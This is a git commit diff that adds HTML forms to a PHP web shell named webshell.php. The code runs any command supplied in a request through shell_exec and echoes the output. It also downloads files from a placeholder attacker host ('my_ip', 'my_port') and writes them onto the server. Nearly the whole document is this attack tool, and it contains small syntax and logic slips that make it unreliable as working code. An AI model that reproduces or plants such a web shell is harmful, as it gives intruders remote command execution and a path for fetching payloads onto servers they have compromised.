ca6b1aaf5cc3369fa988121418159db6f695d88d
Richard Curteis <richardcurteis@users.noreply.github.com>
2019-05-23 14:07:42 +0100

    added forms

--- webshell.php
+++ webshell.php
@@ -1,10 +1,32 @@
-<?php
+<!DOCTYPE html>
+<html>
+<body>
+
+<form action="" method="POST" enctype="multipart/form-data">
+    File:
+    <input type="file" name="fileToUpload">
+    <input type="submit" value="Upload" name="upload">
+</form>
+	
+<br>
+	
+<form method="GET">
+    CMD:
+    <input type="text" name="command">
+    <input type="submit" value="Exec" name="cmd">
+</form>
+
+<pre>
+<?
 	$host = "my_ip";
 	$port = "my_port"
-	if (isset($_REQUEST['upload'])) {
+	if ($_POST['upload']) {
 		file_put_contents($_REQUEST['upload'], file_get_contents("http://$host:$port/" . $_REQUEST['upload']));
 	};
-	if (isset($_REQUEST['cmd'])) {
-		echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
+	if ($_GET['cmd']) {
+	echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
 	};
 ?>
+</pre>
+</body>
+</html>
